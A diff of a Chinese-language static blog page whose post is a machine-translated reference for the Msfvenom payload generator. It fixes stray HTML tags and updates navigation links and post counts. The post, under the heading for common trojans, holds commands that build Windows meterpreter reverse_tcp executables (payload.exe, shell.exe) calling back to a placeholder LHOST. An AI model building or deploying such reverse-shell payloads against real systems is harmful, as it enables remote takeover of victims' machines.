@@ -239,33 +239,33 @@
       
         <h2 id="Msfvenom"><a href="#Msfvenom" class="headerlink" title="Msfvenom"></a>Msfvenom</h2><p>Msfvenom参数：</p>
 <p>用法：/usr/bin/msfvenom[选项]&lt;var=val&gt;</p>
-<p>示例：/usr/bin/msfvenom-p windows/meterpeter/reverse_tcp LHOST=<IP>-f exe-o payload.exe</IP></p>
+<p>示例：/usr/bin/msfvenom-p windows/meterpeter/reverse_tcp LHOST=<IP>-f exe-o payload.exe</p>
 <p>选项：</p>
 <p>-l、 –列出&lt;类型&gt;列出[类型]的所有模块。类型有：有效载荷、编码器、NOP、平台、ARCH、加密、格式等</p>
-<p>-p、 –payload<payload>payload to use（–list payload to list，–list参数选项）。为自定义指定“-”或STDIN</payload></p>
-<p>–列表选项列表–有效载荷<value>的标准、高级和规避选项</value></p>
-<p>-f、 –format<format>输出格式（使用–list要列出的格式）</format></p>
+<p>-p、 –payload<payload>payload to use（–list payload to list，–list参数选项）。为自定义指定“-”或STDIN</p>
+<p>–列表选项列表–有效载荷<value>的标准、高级和规避选项</p>
+<p>-f、 –format<format>输出格式（使用–list要列出的格式）</p>
 <p>-e、 –编码器&lt;编码器&gt;要使用的编码器（使用–列出要列出的编码器）</p>
-<p>–服务名称<value>生成服务二进制文件时要使用的服务名称</value></p>
-<p>–sec name<value>生成大型Windows二进制文件时要使用的新节名。默认值：随机4个字符的alpha字符串</value></p>
+<p>–服务名称<value>生成服务二进制文件时要使用的服务名称</p>
+<p>–sec name<value>生成大型Windows二进制文件时要使用的新节名。默认值：随机4个字符的alpha字符串</p>
 <p>–使用所有可用编码器生成尽可能最小的有效负载</p>
-<p>–encrypt<value>要应用于外壳代码的加密或编码类型（使用–list encrypt to list）</value></p>
-<p>–加密密钥<value>用于–encrypt的密钥</value></p>
-<p>–encrypt iv<value>的初始化向量–encrypt</value></p>
-<p>-a、 –arch<arch>用于–payload和–encoder的体系结构（使用–list-arch列出）</arch></p>
-<p>–平台<platform>platform for–payload（使用–list要列出的平台）</platform></p>
-<p>-o、 –out<path></path>将有效负载保存到文件</p>
-<p>-b、 –要避免的坏字符<list>示例：’\x00\xff’</list></p>
-<p>-n、 –nopled<length>将[length]大小的nopled预先发送到有效负载上</length></p>
-<p>–pad NOP使用-n<length>指定的nopsled大小作为总有效负载大小，自动预加nopsled数量（nops减去有效负载长度）</length></p>
+<p>–encrypt<value>要应用于外壳代码的加密或编码类型（使用–list encrypt to list）</p>
+<p>–加密密钥<value>用于–encrypt的密钥</p>
+<p>–encrypt iv<value>的初始化向量–encrypt</p>
+<p>-a、 –arch<arch>用于–payload和–encoder的体系结构（使用–list-arch列出）</p>
+<p>–平台<platform>platform for–payload（使用–list要列出的平台）</p>
+<p>-o、 –out<path>将有效负载保存到文件</p>
+<p>-b、 –要避免的坏字符<list>示例：’\x00\xff’</p>
+<p>-n、 –nopled<length>将[length]大小的nopled预先发送到有效负载上</p>
+<p>–pad NOP使用-n<length>指定的nopsled大小作为总有效负载大小，自动预加nopsled数量（nops减去有效负载长度）</p>
 <p>-s、 –空间&lt;长度&gt;产生的有效载荷的最大尺寸</p>
 <p>–编码器空间&lt;长度&gt;编码有效负载的最大大小（默认为-s值）</p>
 <p>-i、 –迭代&lt;计数&gt;对有效负载进行编码的次数</p>
-<p>-c、 –添加代码<path></path>指定要包含的其他win32外壳代码文件</p>
-<p>-x、 –template<path></path>指定要用作模板的自定义可执行文件</p>
+<p>-c、 –添加代码<path>指定要包含的其他win32外壳代码文件</p>
+<p>-x、 –template<path>指定要用作模板的自定义可执行文件</p>
 <p>-k、 –保留–template行为并将有效负载作为新线程注入</p>
-<p>-v、 –var name<value>指定用于某些输出格式的自定义变量名</value></p>
-<p>-t、 –timeout<second>从STDIN读取有效负载时等待的秒数（默认值为30，0表示禁用）</second></p>
+<p>-v、 –var name<value>指定用于某些输出格式的自定义变量名</p>
+<p>-t、 –timeout<second>从STDIN读取有效负载时等待的秒数（默认值为30，0表示禁用）</p>
 <p>常用木马：</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Windows:
 格式：msfvenom -p windows/x64/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token punctuation">[</span>IP<span class="token punctuation">]</span> <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token punctuation">[</span>PORT<span class="token punctuation">]</span> -f exe <span class="token operator">></span> shell.exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
@@ -346,7 +346,10 @@
     <a href="/2021/11/15/Msfconsole/" rel="prev" title="Msfconsole">
       <i class="fa fa-chevron-left"></i> Msfconsole
     </a></div>
-      <div class="post-nav-item"></div>
+      <div class="post-nav-item">
+    <a href="/2021/11/17/%E5%AF%86%E7%A0%81%E7%AD%96%E7%95%A5%E9%85%8D%E7%BD%AE/" rel="next" title="密码策略配置">
+      密码策略配置 <i class="fa fa-chevron-right"></i>
+    </a></div>
     </div>
       </footer>
     
@@ -421,20 +424,20 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">5</span>
+          <span class="site-state-item-count">6</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-count">2</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-count">2</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
